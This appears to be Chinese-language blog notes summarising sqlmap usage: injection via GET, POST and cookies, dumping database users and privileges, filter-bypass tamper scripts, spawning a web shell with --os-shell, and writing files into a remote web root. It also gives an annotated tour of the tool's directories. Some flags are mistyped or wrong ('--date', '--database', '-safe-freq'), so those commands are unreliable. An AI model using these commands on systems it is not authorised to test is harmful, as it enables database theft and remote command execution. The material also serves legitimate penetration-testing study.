# SqlMap

Sqlmap配有强大的侦测引擎，适用于高级渗透测试用户，不仅可以获得不同数据库的指纹信息，还可以从数据库中提取数据，此外还能够处理潜在的文件系统以及通过数据连接执行系统命令

# 安装

这就不用了，老傻瓜式操作了

# 三种注入方式

Get: 

```
sqlmap -u url
```

Post:

```
sqlmap -u url --forms                //自动获取表单数据
sqlmap -r post.txt                   //从文件中获取Post包
sqlmap -u url --date "test=testsqli" //手动输入Post信息
```

Cookie:

```
sqlmap -u url --cookie "test=testcookie" //手动输入cookie
```

# 获取数据库信息

```
sqlmap -u url --current-user       //获取用户名
sqlmap -u url --current-db         //获取数据库名
sqlmap -u url --database           //获取所有数据库
sqlmap -u url -D database --count  //查看数据量大小
sqlmap -u url --privileges         //查看用户权限
```

# 连接数据库

```
sqlmap -d "mysql://username:password@host:port/databse"

需要自行安装PyhMySql (Github直接搜索就有)
```

# 延时注入

```
sqlmap -u url --delay 2 延时两秒
sqlmap -u url -safe-freq
```

# 命令执行

```
sqlmap -u url --os-shell可以直接生成两个webshell
```

# Tamper

```
sqlmap -u url --tamper="脚本名称"
```

# 文件写入

```
sqlmap -u url --file-write "./mst/mst.txt" --file-dest "d:/www/1.html"  //file-write为本地 file-dest为远程
```

# 目录结构

```
doc/ ---->>>该文件夹包含了sqlmap 的具体使用说明，例如多种语言的简要说明、PDF版的详细说明、FAQ、作者信息等。

extra/  --->>>这里包含了sqlmap的多种额外功能，例如发出声响（beep)、运行cmd、安全执行、shellcode等。

lib/   --->>>这里包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。

plugins/  --->>>这里包含了各种数据库的信息和数据库通用事项。

procs/    --->>> 这里包含了mssqlserver、 mysql、oracle和postgresql的触发程序

shell/    --->>>这里包含了多种注入成功后的9种shell 远程连接命令执行和管理数据库

tamper/       --->>>这里包含了47种的绕过脚本，例如编码绕过、注释绕过等。

thirdparty/  --->>>这里包含了一些其他第三方的插件，例如优化、保持连接、颜色等。

txt/        --->>>这里包含了一些字典，例如用户浏览器代理、表、列、关键词等。

udf/  --->>>这里包含了用户自己定义的攻击载荷。

waf/ --->>>>这里包含了一些44种常见的防火墙特征。

xml/ --->>>这里包含了多种数据库的注入检测载荷、旗标信息以及其他信息。在这里可以看到进行注入的。

README.md--->>>说明文件，简要地指导我们下载、安装和使用sqlmap，里面有多种语言版本(中文)的安装下载使用介绍说明。

sqlmap.conf  --->>>> sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测）。

sqlmap.py*  --->>>> 这是sqlmap 的主程序，可以调用各种参数进行注入任务。

sqlmapapi.py*  --->>>>  这是sqlmap 的api 文件，可以将sqlmap集成到其他平台上。
```

## Reference

https://blog.csdn.net/qq_29277155/article/details/51646932